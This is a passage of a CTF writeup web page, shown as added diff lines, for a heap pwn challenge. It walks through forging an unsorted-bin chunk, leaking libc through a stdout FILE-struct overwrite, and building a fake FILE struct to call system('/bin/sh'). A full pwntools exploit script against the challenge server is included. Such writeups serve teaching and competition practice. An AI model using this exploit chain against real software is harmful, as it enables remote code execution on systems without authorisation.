+<li>Free the variable object with the forged chunk size, inserting the fake chunk into the unsorted bin.</li>
+<li>Now, we can allocate a variable with an appropriate size to remainder the unsorted bin chunk, pushing the <code>main_arena</code> pointer into the buf pointer of allocated variable object.</li>
+<li>Finally, use our victim object to point the buf pointer to the address of the <code>main_arena</code> buf pointer, partial overwriting it to the address of the stdout file struct.</li>
+<li>This gives us a write onto the stdout file struct.</li>
+</ol>
+<pre class="hljs"><code><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>):
+    create(<span class="hljs-string">f&#x27;test<span class="hljs-subst">{i}</span>&#x27;</span>, <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)+i).encode()*<span class="hljs-number">0x20</span>)
+
+nibble = hint(<span class="hljs-string">&#x27;test0&#x27;</span>)
+log.info(<span class="hljs-string">&quot;nibble, %#x&quot;</span>, nibble)
+
+create(<span class="hljs-string">&#x27;test0&#x27;</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x20</span>)
+create(<span class="hljs-string">&#x27;test10&#x27;</span>, <span class="hljs-string">b&#x27;Z&#x27;</span>*<span class="hljs-number">0x20</span>)
+
+modify(<span class="hljs-string">&#x27;test0&#x27;</span>, p16((nibble &lt;&lt; <span class="hljs-number">12</span>) + <span class="hljs-number">0x328</span>)) <span class="hljs-comment"># 2 LSBs of the size header address</span>
+modify(<span class="hljs-string">&#x27;test10&#x27;</span>, p16(<span class="hljs-number">0x481</span>))		     <span class="hljs-comment"># fake size	</span>
+
+create(<span class="hljs-string">&#x27;test1&#x27;</span>, <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x20</span>)                   <span class="hljs-comment"># free the fake unsorted chunk</span>
+create(<span class="hljs-string">&#x27;test11&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>*<span class="hljs-number">0x20</span>)                   <span class="hljs-comment"># remaindering</span>
+
+modify(<span class="hljs-string">&#x27;test0&#x27;</span>, p16((nibble &lt;&lt; <span class="hljs-number">12</span>) + <span class="hljs-number">0x3b0</span>)) <span class="hljs-comment"># address of the buf pointer containing main_arena </span>
+modify(<span class="hljs-string">&#x27;test10&#x27;</span>, p16(<span class="hljs-number">0xd5c0</span>))                <span class="hljs-comment"># 2 LSBs of the stdout file struct address</span>
+</code></pre>
+<h3 id="getting-our-leak"tabindex="-1">Getting Our Leak</h3>
+<p>Now, we have our write onto the stdout file struct. How can we coerce stdout into giving us a leak?</p>
+<p>Looking at the stdout file struct:</p>
+<pre class="hljs"><code><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> _<span class="hljs-title">IO_2_1_stdout</span> {</span>
+  _flags = <span class="hljs-number">0xfbad2887</span>,
+  _IO_read_ptr = <span class="hljs-number">0x7ffff7f99643</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">&quot;\n&quot;</span>,
+  _IO_read_end = <span class="hljs-number">0x7ffff7f99643</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">&quot;\n&quot;</span>,
+  _IO_read_base = <span class="hljs-number">0x7ffff7f99643</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">&quot;\n&quot;</span>,
+  _IO_write_base = <span class="hljs-number">0x7ffff7f99643</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">&quot;\n&quot;</span>,
+  _IO_write_ptr = <span class="hljs-number">0x7ffff7f99643</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">&quot;\n&quot;</span>,
+  _IO_write_end = <span class="hljs-number">0x7ffff7f99643</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">&quot;\n&quot;</span>,
+  _IO_buf_base = <span class="hljs-number">0x7ffff7f99643</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">&quot;\n&quot;</span>,
+  _IO_buf_end = <span class="hljs-number">0x7ffff7f99644</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">132</span>&gt; <span class="hljs-string">&quot;&quot;</span>,
+  _IO_save_base = <span class="hljs-number">0x0</span>,
+  _IO_backup_base = <span class="hljs-number">0x0</span>,
+  _IO_save_end = <span class="hljs-number">0x0</span>,
+  _markers = <span class="hljs-number">0x0</span>,
+  _chain = <span class="hljs-number">0x7ffff7f988e0</span> &lt;_IO_2_1_stdin_&gt;,
+  _fileno = <span class="hljs-number">0x1</span>,
+  _flags2 = <span class="hljs-number">0x0</span>,
+  _short_backupbuf = <span class="hljs-string">&quot;&quot;</span>,
+  _old_offset = <span class="hljs-number">0xffffffffffffffff</span>,
+  _cur_column = <span class="hljs-number">0x0</span>,
+  _vtable_offset = <span class="hljs-number">0x0</span>,
+  _shortbuf = <span class="hljs-string">&quot;\n&quot;</span>,
+  _lock = <span class="hljs-number">0x7ffff7f9a7b0</span> &lt;_IO_stdfile_1_lock&gt;,
+  _offset = <span class="hljs-number">0xffffffffffffffff</span>,
+  _codecvt = <span class="hljs-number">0x0</span>,
+  _wide_data = <span class="hljs-number">0x7ffff7f987e0</span> &lt;_IO_wide_data_1&gt;,
+  _freeres_list = <span class="hljs-number">0x0</span>,
+  _freeres_buf = <span class="hljs-number">0x0</span>,
+  _prevchain = <span class="hljs-number">0x7ffff7f99548</span> &lt;_IO_2_1_stderr_+<span class="hljs-number">104</span>&gt;,
+  _mode = <span class="hljs-number">0xffffffff</span>,
+  _unused2 = <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats <span class="hljs-number">19</span> times&gt;
+}
+</code></pre>
+<p><a href="https://github.com/nobodyisnobody/docs/tree/main/using.stdout.as.a.read.primitive">nobodyisnobody</a> details a way to gain a libc leak by partial overwriting the <code>_IO_write_base</code> field of the stdout file struct, while setting the flags to <code>0xfbad1887</code>, making stdout think it’s writing from buffered data.</p>
+<p>The idea is to trick stdout into thinking there is still data to-be-written by partial overwriting <code>_IO_write_base</code> to be lesser than <code>_IO_write_ptr</code> and <code>_IO_write_end</code></p>
+<p>This gives us our libc leak:</p>
+<pre class="hljs"><code>modify(<span class="hljs-string">&#x27;test10&#x27;</span>, p16(<span class="hljs-number">0xd5c0</span>))
+modify(<span class="hljs-string">&#x27;test2&#x27;</span>, p64(<span class="hljs-number">0xfbad1887</span>))
+
+modify(<span class="hljs-string">&#x27;test10&#x27;</span>, p16(<span class="hljs-number">0xd5e0</span>))
+modify(<span class="hljs-string">&#x27;test2&#x27;</span>, p16(<span class="hljs-number">0xc8e0</span>))
+
+p.recv(<span class="hljs-number">8</span>)
+heap_base = u64(p.recv(<span class="hljs-number">8</span>)) &amp; ~<span class="hljs-number">0xfff</span>
+log.info(<span class="hljs-string">&quot;heap_base, %#x&quot;</span>, heap_base)
+p.recv(<span class="hljs-number">0x78</span>)
+libc.address = u64(p.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x1ea7c0</span>
+log.info(<span class="hljs-string">&quot;libc.address, %#x&quot;</span>, libc.address)
+
+ld.address = libc.address + <span class="hljs-number">0x213000</span>
+log.info(<span class="hljs-string">&quot;ld.address, %#x&quot;</span>, ld.address)
+</code></pre>
+<p>Now, since we have libc base, we can move onto RCE!</p>
+<h3 id="remote-code-execution"tabindex="-1">Remote Code Execution</h3>
+<p>At this point in time, given we have write onto the stdout file struct, most generic heap challenges, would immediately gain a shell by performing an FSOP attack on stdout to call <code>system(&quot;/bin/sh&quot;)</code> and pop a shell using their favourite FSOP technique, either House of Apple, or any other.</p>
+<p>However, there is one crucial detail to be noted for this challenge: <strong>we cannot write null bytes</strong></p>
+<p>As string values are null-terminated, the program only copies data till the first null byte. This immediately breaks most techniques which write directly on the stdout file struct as they usually require us to null out certain fields.</p>
+<p>What can we do now?</p>
+<p>Answer: if you can’t lead a horse to water, bring the water to the horse</p>
+<p>When the <code>stdout</code> symbol is exported and used in the ELF binary, it turns out that GLIBC refers to that symbol in the ELF binary instead for the pointer to the stdout file struct.</p>
+<p>If we can overwrite that pointer in the ELF to point to somewhere else in memory containing our fake stdout file struct, we could achieve the same effect as writing to the file struct in place.</p>
+<p>We will first need to leak the PIE base of the ELF binary. Using GDB, we find that there are pointers in libc that point back to the ELF (ironically, the very pointers that LIBC uses to refer to the stdout file struct!)</p>
+<pre class="hljs"><code>p2p libc main
+[+] Searching for addresses in 'libc' that point to 'main'
+libc.so.6: 0x00007ffff7f97e18 &lt;_GLOBAL_OFFSET_TABLE_+0x2b8&gt;  -&gt;  0x0000555555557020 &lt;stdout@GLIBC_2.2.5&gt;  -&gt;  0x00007ffff7f995c0 &lt;_IO_2_1_stdout_&gt;  -&gt;  0x00000000fbad2887
+libc.so.6: 0x00007ffff7f97f48 &lt;_GLOBAL_OFFSET_TABLE_+0x3e8&gt;  -&gt;  0x0000555555557030 &lt;stdin@GLIBC_2.2.5&gt;  -&gt;  0x00007ffff7f988e0 &lt;_IO_2_1_stdin_&gt;  -&gt;  0x00000000fbad2288
+</code></pre>
+<p>To leak the ELF address at this libc address, we could set <code>_IO_write_base</code> to point to <code>_GLOBAL_OFFSET_TABLE_+0x2b8</code>, giving us a leak of the ELF address (and everything in between - some few 0x1000 bytes of memory hehe)</p>
+<pre class="hljs"><code><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">where, what</span>):
+    modify(<span class="hljs-string">&#x27;test10&#x27;</span>, p64(where))
+    modify(<span class="hljs-string">&#x27;test2&#x27;</span>, p64(what))
+
+write(libc.sym._IO_2_1_stdout_+<span class="hljs-number">32</span>, libc.address+<span class="hljs-number">0x1e7e18</span>)
+elf.address = u64(p.recv(<span class="hljs-number">8</span>)) - elf.sym.stdout
+log.info(<span class="hljs-string">&quot;elf.address, %#x&quot;</span>, elf.address)
+</code></pre>
+<p>Then, we can choose a region of memory with mostly null bytes to write our fake file struct. Overwriting the <code>stdout</code> pointer in the ELF section to point to our fake file struct will then give us our shell:</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+elf = context.binary = ELF(<span class="hljs-string">&quot;./main_patched&quot;</span>)
+libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)
+ld = ELF(<span class="hljs-string">&quot;./ld-linux-x86-64.so.2&quot;</span>)
+context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
+context.terminal = <span class="hljs-string">&#x27;kitty&#x27;</span>
+
+<span class="hljs-comment"># p = process()</span>
+p = remote(<span class="hljs-string">&#x27;tcp.ybn.sg&#x27;</span>, <span class="hljs-number">10798</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">name, data</span>):
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(data, <span class="hljs-built_in">bytes</span>):
+        p.sendlineafter(<span class="hljs-string">b&#x27;&gt; \n&#x27;</span>, <span class="hljs-string">f&#x27;$<span class="hljs-subst">{name}</span>=&#x27;</span>.encode() + data)
+    <span class="hljs-keyword">else</span>:
+        p.sendlineafter(<span class="hljs-string">b&#x27;&gt; \n&#x27;</span>, <span class="hljs-string">f&#x27;$<span class="hljs-subst">{name}</span>=<span class="hljs-subst">{data}</span>&#x27;</span>.encode())
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">modify</span>(<span class="hljs-params">name, data</span>):
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(data, <span class="hljs-built_in">bytes</span>):
+        p.sendlineafter(<span class="hljs-string">b&#x27;&gt; \n&#x27;</span>, <span class="hljs-string">f&#x27;$<span class="hljs-subst">{name}</span>*=&#x27;</span>.encode() + data)
+    <span class="hljs-keyword">else</span>:
+        p.sendlineafter(<span class="hljs-string">b&#x27;&gt; \n&#x27;</span>, <span class="hljs-string">f&#x27;$<span class="hljs-subst">{name}</span>*=<span class="hljs-subst">{data}</span>&#x27;</span>.encode())
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">hint</span>(<span class="hljs-params">name</span>):
+    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; \n&#x27;</span>, <span class="hljs-string">f&#x27;hint(<span class="hljs-subst">{name}</span>)&#x27;</span>.encode())
+    p.recvuntil(name.encode() + <span class="hljs-string">b&#x27;: &#x27;</span>)
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(p.recvline().strip())
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>):
+    create(<span class="hljs-string">f&#x27;test<span class="hljs-subst">{i}</span>&#x27;</span>, <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)+i).encode()*<span class="hljs-number">0x20</span>)
+
+nibble = hint(<span class="hljs-string">&#x27;test0&#x27;</span>)
+log.info(<span class="hljs-string">&quot;nibble, %#x&quot;</span>, nibble)
+
+create(<span class="hljs-string">&#x27;test0&#x27;</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x20</span>)
+create(<span class="hljs-string">&#x27;test10&#x27;</span>, <span class="hljs-string">b&#x27;Z&#x27;</span>*<span class="hljs-number">0x20</span>)
+
+modify(<span class="hljs-string">&#x27;test0&#x27;</span>, p16((nibble &lt;&lt; <span class="hljs-number">12</span>) + <span class="hljs-number">0x328</span>))
+modify(<span class="hljs-string">&#x27;test10&#x27;</span>, p16(<span class="hljs-number">0x481</span>))
+
+create(<span class="hljs-string">&#x27;test1&#x27;</span>, <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x20</span>)
+create(<span class="hljs-string">&#x27;test11&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>*<span class="hljs-number">0x20</span>)
+
+modify(<span class="hljs-string">&#x27;test0&#x27;</span>, p16((nibble &lt;&lt; <span class="hljs-number">12</span>) + <span class="hljs-number">0x3b0</span>))
+modify(<span class="hljs-string">&#x27;test10&#x27;</span>, p16(<span class="hljs-number">0xd5c0</span>))
+modify(<span class="hljs-string">&#x27;test2&#x27;</span>, p64(<span class="hljs-number">0xfbad1887</span>))
+
+modify(<span class="hljs-string">&#x27;test10&#x27;</span>, p16(<span class="hljs-number">0xd5e0</span>))
+modify(<span class="hljs-string">&#x27;test2&#x27;</span>, p16(<span class="hljs-number">0xc8e0</span>))
+
+p.recv(<span class="hljs-number">8</span>)
+heap_base = u64(p.recv(<span class="hljs-number">8</span>)) &amp; ~<span class="hljs-number">0xfff</span>
+log.info(<span class="hljs-string">&quot;heap_base, %#x&quot;</span>, heap_base)
+p.recv(<span class="hljs-number">0x78</span>)
+libc.address = u64(p.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x1ea7c0</span>
+log.info(<span class="hljs-string">&quot;libc.address, %#x&quot;</span>, libc.address)
+
+ld.address = libc.address + <span class="hljs-number">0x213000</span>
+log.info(<span class="hljs-string">&quot;ld.address, %#x&quot;</span>, ld.address)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">where, what</span>):
+    modify(<span class="hljs-string">&#x27;test10&#x27;</span>, p64(where))
+    modify(<span class="hljs-string">&#x27;test2&#x27;</span>, p64(what))
+
+write(libc.sym._IO_2_1_stdout_+<span class="hljs-number">32</span>, libc.address+<span class="hljs-number">0x1e7e18</span>)
+elf.address = u64(p.recv(<span class="hljs-number">8</span>)) - elf.sym.stdout
+log.info(<span class="hljs-string">&quot;elf.address, %#x&quot;</span>, elf.address)
+
+target = libc.address + <span class="hljs-number">0x1eab10</span> + <span class="hljs-number">0x10</span>
+write(target, <span class="hljs-number">0x3b01010101010101</span>)
+write(target+<span class="hljs-number">16</span>, libc.sym.system)
+write(target+<span class="hljs-number">0x28</span>, target+<span class="hljs-number">0x210</span>)
+write(target+<span class="hljs-number">72</span>, libc.address+<span class="hljs-number">0x0000000000137820</span>)
+write(target+<span class="hljs-number">48</span>, u64(<span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span>))
+write(target+<span class="hljs-number">136</span>, libc.address+<span class="hljs-number">0x1ea7b0</span>)
+write(target+<span class="hljs-number">152</span>, target+<span class="hljs-number">0xb8</span>)
+write(target+<span class="hljs-number">160</span>, target+<span class="hljs-number">0x200</span>)
+write(target+<span class="hljs-number">160</span>+<span class="hljs-number">0x18</span>, target+<span class="hljs-number">0x20</span>)
+write(target+<span class="hljs-number">0xd8</span>, libc.sym._IO_wfile_jumps-<span class="hljs-number">0x18</span>)
+write(target+<span class="hljs-number">0x90</span>, u64(<span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">8</span>))
+write(target+<span class="hljs-number">0x78</span>, u64(<span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">8</span>))
+
+write(elf.sym.stdout, target)
+
+p.interactive()
+</code></pre>
+
+      </section>
+      <section id="article-navigation">
+        
+        
+          <div class="article-navigation-item article-navigation-prev">
+            <a href="/article/1.html">
+              <div class="article-navigation-arrow article-navigation-prev">＞</div>
+              <div class="article-navigation-content article-navigation-prev">
+                <p class="article-navigation-title">UMDCTF 2025 - one-write</p>
+                <p class="article-navigation-subtitle">Writeup for the pwn challenge one-write in UMDCTF 2025</p>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      <section id="article-list-button-container">
+        <a href="/articles.html">
+          <div id="article-list-button">📚</div>
+        </a>
+      </section>
+    </article>
+  </main>
+
+
